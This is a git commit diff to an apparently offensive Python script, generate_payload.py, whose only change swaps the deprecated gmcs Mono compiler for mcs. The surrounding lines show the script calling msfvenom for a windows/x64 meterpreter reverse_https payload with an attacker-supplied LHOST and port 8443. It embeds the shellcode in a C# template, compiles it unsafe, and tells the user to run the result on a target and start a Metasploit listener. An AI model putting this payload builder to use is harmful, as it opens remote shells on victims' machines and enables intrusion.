21e227894b54b5e8314a1a22c98ebb31ddc668c4
root <root@localhost.localdomain>
2018-05-29 05:32:15 -0400

    gmcs is deprecated for the new mono framework.Modified to mcs and tested

--- generate_payload.py
+++ generate_payload.py
@@ -5,7 +5,7 @@ if len(sys.argv)<=1:
 	exit(0)
 if not os.path.isfile("runcode.exe"):
 	print "generating runcode.exe"
-	os.system('gmcs -unsafe -out:runcode.exe runcode.cs')
+	os.system('mcs -unsafe -out:runcode.exe runcode.cs')
 print "generating msf payload"
 os.system('msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=' + sys.argv[1]+' LPORT=8443  -f csharp > tmpf.txt')
 os.system('sed \'1d\' tmpf.txt > tmpfile; mv tmpfile tmpf.txt')
@@ -18,7 +18,7 @@ templatestring=templatestring%shellstring
 textgen=open("payload1.cs","w")
 textgen.write(templatestring)
 textgen.close()
-os.system('gmcs -unsafe -out:payload1.exe payload1.cs')
+os.system('mcs -unsafe -out:payload1.exe payload1.cs')
 os.system('mono payload1.exe')
 print ('copy runcode.exe and test1.txt into the target and run '
        'runcode.exe;setup msf listener for ' 
